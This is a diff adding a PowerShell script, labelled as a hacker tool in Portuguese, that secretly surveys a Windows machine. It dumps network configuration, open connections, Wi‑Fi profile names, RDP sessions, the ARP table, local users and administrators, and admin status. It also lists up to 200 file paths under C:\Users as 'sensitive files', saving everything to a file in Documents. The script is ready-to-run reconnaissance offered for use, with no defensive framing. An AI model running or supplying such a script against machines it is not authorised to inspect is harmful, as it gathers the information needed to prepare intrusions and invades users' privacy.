@@ -1,0 +1,58 @@
+#DLL SACA HACKER
+
+
+# Define caminho para a pasta Documentos do usuário atual
+$docPath = [Environment]::GetFolderPath("MyDocuments")
+$dumpFile = "$docPath\sysdump.txt"
+
+function Write-Log {
+    param([string]$text)
+    Add-Content -Path $dumpFile -Value "[*] $text"
+}
+
+# Coleta de info de rede
+Write-Log "IPCONFIG:"
+ipconfig /all >> $dumpFile
+
+Write-Log "Netstat:"
+netstat -ano >> $dumpFile
+
+# Perfis Wi-Fi
+Write-Log "Perfis Wi-Fi:"
+netsh wlan show profile >> $dumpFile
+
+# Interfaces
+Write-Log "Interfaces WLAN:"
+netsh wlan show interfaces >> $dumpFile
+
+# Conexões Remotas
+Write-Log "Sessões RDP:"
+qwinsta >> $dumpFile
+
+Write-Log "Tabela ARP:"
+arp -a >> $dumpFile
+
+# Arquivos dos usuários
+Write-Log "Arquivos sensíveis:"
+Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue -Force |
+    Where-Object { $_.PSIsContainer -eq $false } |
+    Select-Object -First 200 |
+    ForEach-Object { Add-Content -Path $dumpFile -Value $_.FullName }
+
+# Usuários locais
+Write-Log "Usuários:"
+net user >> $dumpFile
+
+Write-Log "Administradores:"
+net localgroup administrators >> $dumpFile
+
+# Verifica se está como admin
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($identity)
+if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Log "[+] Executando como ADMIN"
+} else {
+    Write-Log "[-] Sem privilégio de admin"
+}
+
+Write-Log "Fim da coleta. Salvo em: $dumpFile"
